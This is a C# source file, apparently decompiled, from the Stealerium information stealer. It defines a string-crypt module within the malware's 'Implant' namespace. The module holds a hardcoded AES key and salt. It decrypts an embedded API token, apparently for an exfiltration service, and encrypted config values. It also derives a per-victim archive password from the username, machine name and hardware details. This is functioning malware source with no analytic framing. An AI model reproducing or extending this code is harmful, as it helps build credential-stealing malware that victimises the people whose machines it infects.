using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Stealerium.Target.System;

namespace Stealerium.Modules.Implant;

internal sealed class StringsCrypt
{
	public static string ArchivePassword = GenerateRandomData();

	private static readonly byte[] SaltBytes = new byte[36]
	{
		102, 51, 111, 51, 75, 45, 49, 49, 61, 71,
		45, 78, 55, 86, 74, 116, 111, 122, 79, 87,
		82, 114, 61, 40, 116, 78, 90, 66, 102, 75,
		43, 98, 83, 55, 70, 121
	};

	private static readonly byte[] CryptKey = new byte[35]
	{
		59, 38, 75, 70, 33, 77, 33, 104, 56, 94,
		105, 84, 58, 60, 41, 97, 63, 126, 109, 88,
		101, 78, 42, 126, 111, 63, 103, 78, 91, 118,
		64, 114, 81, 61, 66
	};

	public static string AnonApiToken = Decrypt(new byte[32]
	{
		240, 69, 91, 47, 188, 54, 254, 184, 162, 97,
		18, 252, 143, 255, 136, 205, 102, 226, 235, 10,
		49, 114, 229, 124, 201, 6, 163, 171, 240, 62,
		178, 215
	});

	public static string GenerateRandomData(string sd = "0")
	{
		string text = sd;
		if (sd == "0")
		{
			text = ((DateTimeOffset)DateTime.Parse(SystemInfo.Datenow)).Ticks.ToString();
		}
		string s = text + "-" + SystemInfo.Username + "-" + SystemInfo.Compname + "-" + SystemInfo.Culture + "-" + SystemInfo.GetCpuName() + "-" + SystemInfo.GetGpuName();
		using MD5 mD = MD5.Create();
		return string.Join("", mD.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(delegate(byte ba)
		{
			byte b = ba;
			return b.ToString("x2");
		}));
	}

	public static string Decrypt(byte[] bytesToBeDecrypted)
	{
		byte[] bytes;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(CryptKey, SaltBytes, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			bytes = memoryStream.ToArray();
		}
		return Encoding.UTF8.GetString(bytes);
	}

	public static string DecryptConfig(string value)
	{
		if (string.IsNullOrEmpty(value))
		{
			return "";
		}
		if (!value.StartsWith("ENCRYPTED:"))
		{
			return value;
		}
		return Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
	}
}
